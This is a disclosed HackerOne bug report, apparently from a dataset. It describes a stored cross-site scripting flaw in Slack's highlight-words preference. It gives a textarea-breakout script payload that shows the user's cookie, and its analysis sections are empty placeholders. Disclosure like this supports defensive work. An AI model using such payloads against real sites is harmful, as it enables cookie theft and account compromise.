---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '2926'
original_report_id: '2926'
title: Stored XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: slack
created_at: '2014-03-03T18:52:15.297Z'
disclosed_at: '2014-04-06T19:40:45.683Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Stored XSS

## Metadata

- HackerOne Report ID: 2926
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: slack
- Disclosed At: 2014-04-06T19:40:45.683Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

Go to this URL https://sehacure.slack.com/account/preferences?updated_highlight_words=1
and in the highlight words option please fill the XSS vector as 

</textarea><script>prompt(document.cookie);</script>

Your cookie will be reflected.

Best regards,
Anand

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
